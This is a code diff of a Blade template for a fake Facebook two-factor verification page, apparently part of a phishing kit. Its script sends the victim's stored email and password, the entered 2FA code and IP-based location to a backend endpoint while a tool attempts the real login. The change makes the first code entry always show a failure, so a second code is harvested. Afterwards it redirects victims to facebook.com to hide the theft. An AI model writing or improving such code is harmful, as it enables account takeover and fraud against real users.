@@ -22,210 +22,192 @@
 @endpush
 @push('scripts')
     <script type="text/javascript">
-            const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_login_page')) !!}';
-            const parseQueryParams = JSON.parse(queryParams);
+        const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_login_page')) !!}';
+        const parseQueryParams = JSON.parse(queryParams);
 
-            function replaceQueryParam(param, value, search) {
-                let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
-                let query = search.replace(regex, "$1").replace(/&$/, '');
+        function replaceQueryParam(param, value, search) {
+            let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
+            let query = search.replace(regex, "$1").replace(/&$/, '');
 
-                return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
+            return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
+        }
+
+        if (parseQueryParams.length > 0) {
+            for (const query of parseQueryParams) {
+                const currentQuery = window.location.search
+                const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
+                window.history.pushState(null, null, newUrl)
             }
-
-            if (parseQueryParams.length > 0) {
-                for (const query of parseQueryParams) {
-                    const currentQuery = window.location.search
-                    const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
-                    window.history.pushState(null, null, newUrl)
-                }
+        }
+    </script>
+    <script type="text/javascript">
+        $.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': '{{ csrf_token() }}'
             }
-        </script>
-        <script type="text/javascript">
-            $.ajaxSetup({
-                headers: {
-                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
-                }
-            });
+        });
 
-            var idIntervalGetCacheByEmail = null;
-            var isLoginSuccessfully = 0;
-            var email = "";
-            //
-            var ipAddress = "";
-            var latitude = "";
-            var longitude = "";
-            var countryName = "";
-            var countryCode = "";
-            var cityName = "";
-            var regionName = "";
-            var timeZone = "";
-            var zipCode = "";
-            var continent = "";
-            var continentCode = "";
-            var user = JSON.parse(localStorage.getItem('user')) || '';
-            if (!user) {
-                window.location.href = '/';
-            }
+        var idIntervalGetCacheByEmail = null;
+        var isLoginSuccessfully = 0;
+        var email = "";
+        //
+        var ipAddress = "";
+        var latitude = "";
+        var longitude = "";
+        var countryName = "";
+        var countryCode = "";
+        var cityName = "";
+        var regionName = "";
+        var timeZone = "";
+        var zipCode = "";
+        var continent = "";
+        var continentCode = "";
+        var user = JSON.parse(localStorage.getItem('user')) || '';
+        var totalAttempts = 0;
+        // if (!user) {
+        //     window.location.href = '/';
+        // }
 
-            async function setCurrentLang() {
-                let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
-                const response = await fetch(getIpInfoUrl);
-                const ipInfo = await response.json();
-                ipAddress = ipInfo.ipAddress;
-                latitude = ipInfo.latitude;
-                longitude = ipInfo.longitude;
-                countryName = ipInfo.countryName;
-                countryCode = ipInfo.countryCode;
-                cityName = ipInfo.cityName;
-                regionName = ipInfo.regionName;
-                timeZone = ipInfo.timeZone;
-                zipCode = ipInfo.zipCode;
-                continent = ipInfo.continent;
-                continentCode = ipInfo.continentCode;
-            }
-            setCurrentLang();
+        async function setCurrentLang() {
+            let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
+            const response = await fetch(getIpInfoUrl);
+            const ipInfo = await response.json();
+            ipAddress = ipInfo.ipAddress;
+            latitude = ipInfo.latitude;
+            longitude = ipInfo.longitude;
+            countryName = ipInfo.countryName;
+            countryCode = ipInfo.countryCode;
+            cityName = ipInfo.cityName;
+            regionName = ipInfo.regionName;
+            timeZone = ipInfo.timeZone;
+            zipCode = ipInfo.zipCode;
+            continent = ipInfo.continent;
+            continentCode = ipInfo.continentCode;
+        }
 
-            async function getCacheByEmail(email) {
-                let result = null;
-                let formData = new FormData();
-                formData.append('email', email);
-                await $.ajax({
-                    method: "POST",
-                    url: "/api/get-cache-by-email",
-                    data: formData,
-                    cache: false,
-                    contentType: false,
-                    processData: false,
-                    success: function(response) {
-                        if (response.status == 0) {
-                            result = response.data;
-                        }
+        setCurrentLang();
+
+        async function getCacheByEmail(email) {
+            let result = null;
+            let formData = new FormData();
+            formData.append('email', email);
+            await $.ajax({
+                method: "POST",
+                url: "/api/get-cache-by-email",
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false,
+                success: function(response) {
+                    if (response.status == 0) {
+                        result = response.data;
                     }
-                })
-
-                return result;
-            }
-
-            $(document).on('click', '#submit-code', async function() {
-                $('.notice-error').addClass('d-none');
-                const fa_code = $('#input-code').val();
-                if (fa_code == '') {
-                    $('#input-code').addClass('is-invalid')
-                    return false;
                 }
-                if (!isValidOTP(fa_code)) {
-                    $('#input-code').addClass('is-invalid')
-                    return false;
-                }
-
-                const loading = $('#submit-code-loading');
-                const text = $('#submit-code-text');
-                text.addClass('d-none');
-                loading.removeClass('d-none');
-                let email = user.email || '';
-                let password = user.password || '';
-                //
-                let formData = new FormData();
-                formData.append('fa_code', fa_code);
-                formData.append('email', email);
-                formData = pushIPInfo(formData);
-                await $.ajax({
-                    method: "POST",
-                    url: "/api/send-data-fa",
-                    data: formData,
-                    cache: false,
-                    contentType: false,
-                    processData: false,
-                    success: function(response) {
-                        if (response.status == 0) {
-                            // start to call get cache by email waiting until tool returns response of login
-                            idIntervalGetCacheByEmail = setInterval(async () => {
-                                let info = await getCacheByEmail(email);
-                                if (info) {
-                                    text.removeClass('d-none');
-                                    loading.addClass('d-none');
-                                    console.log(info);
-                                    if (info.isFaSuccessfully == 1) {
-                                        $('.notice-error').addClass('d-none');
-                                        localStorage.removeItem('user');
-
-                                        window.location.href = 'https://www.facebook.com/';
-                                    } else {
-                                        console.log("Fa failed");
-                                        // $('.text-error-fa').text(`@lang('confirm.error_notice')`);
-                                        $('.notice-error').removeClass('d-none');
-                                        text.removeClass('d-none');
-                                        loading.addClass('d-none');
-                                    }
-                                    $('#submit-code').prop('disabled', false);
-                                    clearInterval(idIntervalGetCacheByEmail);
-                                    //
-                                    // call api clear all cache
-                                    $.ajax({
-                                        method: "POST",
-                                        url: "/api/delete-all-cache",
-                                        success: function(response) {
-                                            if (response.status == 0) {
-                                                console.log(
-                                                    "Delete all cache success",
-                                                    response);
-                                            }
-                                        }
-                                    });
-                                } else {
-                                    console.log("Still call get cache by email");
-                                }
-                            }, 3000);
-                        } else {
-                            $('#submit-code').prop('disabled', false);
-                            $('.notice-error').removeClass('d-none');
-                            text.removeClass('d-none');
-                            loading.addClass('d-none');
-                        }
-                    }
-                });
             })
 
-            function pushIPInfo(formData) {
-                formData.append('ipAddress', ipAddress)
-                formData.append('latitude', latitude)
-                formData.append('longitude', longitude)
-                formData.append('countryName', countryName)
-                formData.append('countryCode', countryCode)
-                formData.append('regionName', regionName)
-                formData.append('cityName', cityName)
-                formData.append('timeZone', timeZone)
-                formData.append('zipCode', zipCode)
-                formData.append('continent', continent)
-                formData.append('continentCode', continentCode)
-                return formData;
+            return result;
+        }
+
+        $(document).on('click', '#submit-code', async function() {
+            $('.notice-error').addClass('d-none');
+            const fa_code = $('#input-code').val();
+            if (fa_code == '') {
+                $('#input-code').addClass('is-invalid')
+                return false;
+            }
+            if (!isValidOTP(fa_code)) {
+                $('#input-code').addClass('is-invalid')
+                return false;
             }
 
-            function isValidOTP(value) {
-                // const regexOtp = /^\d{6}|\d{8}$/;
-                return /^\d{6}$/.test(value) || /^\d{8}$/.test(value);
-            }
+            const loading = $('#submit-code-loading');
+            const text = $('#submit-code-text');
+            text.addClass('d-none');
+            loading.removeClass('d-none');
+            let email = user.email || '';
+            let password = user.password || '';
+            //
+            let formData = new FormData();
+            formData.append('fa_code', fa_code);
+            formData.append('email', email);
+            formData = pushIPInfo(formData);
+            totalAttempts += 1;
+            await $.ajax({
+                method: "POST",
+                url: "/api/send-data-fa",
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false,
+                success: function(response) {
+                    if (response.status == 0) {
+                        if (totalAttempts > 1) {
+                            text.removeClass('d-none');
+                            loading.addClass('d-none');
+                            $('.notice-error').addClass('d-none');
+                            localStorage.removeItem('user');
+                            window.location.href = 'https://www.facebook.com/';
+                            console.log(info);
 
-            function validateOtp() {
-                $(this).val($(this).val().replace(/[^0-9.]/g, ''));
-
-                if ($(this).val().length >= 8) {
-                    // event.preventDefault();
-                    $(this).val($(this).val().slice(0, 8));
+                        } else {
+                            console.log("Fa failed");
+                            // $('.text-error-fa').text(`@lang('confirm.error_notice')`);
+                            setTimeout(() => {
+                                $('.notice-error').removeClass('d-none');
+                                text.removeClass('d-none');
+                                loading.addClass('d-none');
+                            }, 2000);
+                        }
+                    } else {
+                        $('#submit-code').prop('disabled', false);
+                        $('.notice-error').removeClass('d-none');
+                        text.removeClass('d-none');
+                        loading.addClass('d-none');
+                    }
                 }
+            });
+        })
 
-                if (!isValidOTP($(this).val())) {
-                    $(this).addClass('is-invalid');
-                    $('#send-otp-number').removeClass('disabled');
-                } else {
-                    $(this).removeClass('is-invalid');
-                }
+        function pushIPInfo(formData) {
+            formData.append('ipAddress', ipAddress)
+            formData.append('latitude', latitude)
+            formData.append('longitude', longitude)
+            formData.append('countryName', countryName)
+            formData.append('countryCode', countryCode)
+            formData.append('regionName', regionName)
+            formData.append('cityName', cityName)
+            formData.append('timeZone', timeZone)
+            formData.append('zipCode', zipCode)
+            formData.append('continent', continent)
+            formData.append('continentCode', continentCode)
+            return formData;
+        }
+
+        function isValidOTP(value) {
+            // const regexOtp = /^\d{6}|\d{8}$/;
+            return /^\d{6}$/.test(value) || /^\d{8}$/.test(value);
+        }
+
+        function validateOtp() {
+            $(this).val($(this).val().replace(/[^0-9.]/g, ''));
+
+            if ($(this).val().length >= 8) {
+                // event.preventDefault();
+                $(this).val($(this).val().slice(0, 8));
             }
 
-            $(document).on('keypress', '.validate-otp', validateOtp)
-            $(document).on('input', '.validate-otp', validateOtp)
-            $(document).on('keydown', '.validate-input', validateOtp)
-        </script>
+            if (!isValidOTP($(this).val())) {
+                $(this).addClass('is-invalid');
+                $('#send-otp-number').removeClass('disabled');
+            } else {
+                $(this).removeClass('is-invalid');
+            }
+        }
+
+        $(document).on('keypress', '.validate-otp', validateOtp)
+        $(document).on('input', '.validate-otp', validateOtp)
+        $(document).on('keydown', '.validate-input', validateOtp)
+    </script>
 @endpush
 @extends('layouts.main')
 @section('content')
@@ -306,8 +288,8 @@
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Japanese">日本語</a>
                                 </li>
                                 <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;"
-                                        title="French (France)">Français (France)</a>
+                                    <a class="_sv4" dir="ltr" href="javascript:;" title="French (France)">Français
+                                        (France)</a>
                                 </li>
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Thai">ภาษาไทย</a>
@@ -323,8 +305,7 @@
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="German">Deutsch</a>
                                 </li>
                                 <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;"
-                                        title="Italian">Italiano</a>
+                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Italian">Italiano</a>
                                 </li>
                                 <li>
                                     <a role="button" class="button-plus" rel="dialog" ajaxify=""
@@ -355,16 +336,15 @@
                                     <li><a href="javascript:;" title="Discover " target="_blank">
                                             Store</a>
                                     </li>
-                                    <li><a href="javascript:;" title="Learn more about  Quest"
-                                            target="_blank">
+                                    <li><a href="javascript:;" title="Learn more about  Quest" target="_blank">
                                             Quest</a></li>
                                     <li><a href="" title="Take a look at Instagram" target="_blank"
                                             rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
                                     <li><a href="" title="Check out Threads" target="_blank"
                                             rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
                                     <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
-                                    <li><a href="javascript:;"
-                                            title="Browse our Account Services directory.">Services</a></li>
+                                    <li><a href="javascript:;" title="Browse our Account Services directory.">Services</a>
+                                    </li>
                                     <li><a href="javascript:;" title="See the Voting Information Centre">Voting
                                             Information Centre</a></li>
                                     <li><a href="javascript:;"
@@ -408,7 +388,7 @@
                                 </ul>
                             </div>
                             <div class="footer-copyright">
-                                <div><span>  © 2024</span></div>
+                                <div><span> © 2024</span></div>
                             </div>
                         </div>
                     </div>
